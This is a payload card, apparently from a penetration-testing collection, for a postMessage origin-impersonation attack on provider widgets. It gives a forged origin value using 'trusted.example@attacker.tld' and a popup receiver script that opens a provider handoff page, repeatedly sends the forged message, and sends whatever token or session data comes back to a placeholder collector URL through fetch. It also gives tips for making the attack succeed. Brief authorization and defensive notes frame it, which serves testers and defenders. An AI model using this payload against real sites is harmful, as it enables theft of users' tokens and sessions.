# postMessage Origin Impersonation Popup Payload

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a provider widget hands off a token or session via `postMessage`
- the widget trusts `event.data.origin` or a similar attacker-controlled field
- the reply target is `window.opener` or `window.parent`
- the claimed origin is regex/string-checked instead of exactly parsed

## Minimal Payload

Forge a trusted-looking origin with attacker-controlled real destination:

```javascript
popup.postMessage(
  { origin: 'https://trusted.example@attacker.tld' },
  '*'
);
```

## Popup Receiver Example

```javascript
window.addEventListener('message', function(e) {
  fetch('https://[collector]?d=' + encodeURIComponent(JSON.stringify(e.data)));
});

var popup = window.open('https://[provider]/embed/handoff', 'pw');
var n = 0;
var iv = setInterval(function() {
  try {
    popup.postMessage({ origin: 'https://trusted.example@attacker.tld' }, '*');
  } catch (e) {}
  if (++n > 30) clearInterval(iv);
}, 500);
```

## Why Popup Often Works Better

If the provider relies on ambient cookies, iframes may receive an empty session due to third-party cookie restrictions. A popup or top-level handoff page often carries the real authenticated cookie.

## Why It Works

The widget should trust `event.origin`, but instead trusts a self-declared origin inside `event.data`. If it reuses that claimed value as `postMessage` `targetOrigin`, browser parsing can deliver the reply to the attacker's real origin.

## Why It Fails

- The widget validates `event.origin`
- The allowlist compares exact parsed origins
- The provider uses one-time scoped tokens instead of raw cookies
- The target flow does not open external attacker-controlled partner URLs

## Common Mistakes

- Using an iframe when cookies are stripped in third-party context
- Sending the forged message only once before the receiver listener is installed
- Forgetting that `https://trusted.example@attacker.tld` resolves to `attacker.tld`
- Storing live flags, collector URLs, or tokens in reusable payload files

## Defensive Note

Partner identity in `postMessage` flows must come from browser metadata (`event.origin`), never from self-asserted fields inside `event.data`.
